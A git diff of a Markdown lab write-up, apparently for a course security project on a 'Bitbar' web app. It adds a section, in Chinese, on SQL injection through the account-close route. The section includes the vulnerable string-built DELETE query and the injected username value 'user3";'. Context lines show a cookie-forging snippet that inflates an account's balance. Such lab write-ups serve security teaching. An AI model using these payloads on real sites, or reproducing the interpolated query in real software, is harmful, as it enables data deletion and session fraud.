@@ -13,6 +13,7 @@
     + [Exploit Bravo Cross Site Request Forgery](#exploit-bravo-cross-site-request-forgery)
     + [Exploit Charlie Session Hijacking with Cookies](#exploit-charlie-session-hijacking-with-cookies)
     + [Exploit Delta Cooking the Books with Cookies](#exploit-delta-cooking-the-books-with-cookies)
+    + [Exploit Echo SQL Injection](#exploit-echo-sql-injection)
 
 # Proj1
 ## Target1 Buffer overflow
@@ -1251,4 +1252,24 @@ var jsonObj = JSON.parse(json);
 jsonObj.account.bitbars = 1000000
 var attackerCookie = JSON.stringify(jsonObj);
 document.cookie = "session=".concat(btoa(attackerCookie));
+```
+
+## Exploit Echo SQL Injection
+题目要求，创建一个新的用户，点击`close`时候删除`user3`，`close`的API接口如下，可以看到SQL命令把整个`username`都放进去了，所以可以注入SQL，只要使得`username=user3";`即可
+
+`close` API最后log一下db，发现`user3`已经消失了
+```javascript
+router.get('/close', asyncMiddleware(async (req, res, next) => {
+  if(req.session.loggedIn == false) {
+    render(req, res, next, 'login/form', 'Login', 'You must be logged in to use this feature!');
+    return;
+  };
+  const db = await dbPromise;
+  const query = `DELETE FROM Users WHERE username == "${req.session.account.username}";`;
+  await db.get(query);
+  req.session.loggedIn = false;
+  req.session.account = {};
+  render(req, res, next, 'index', 'Bitbar Home', 'Deleted account successfully!');
+  logDatabaseState();
+}));
 ```
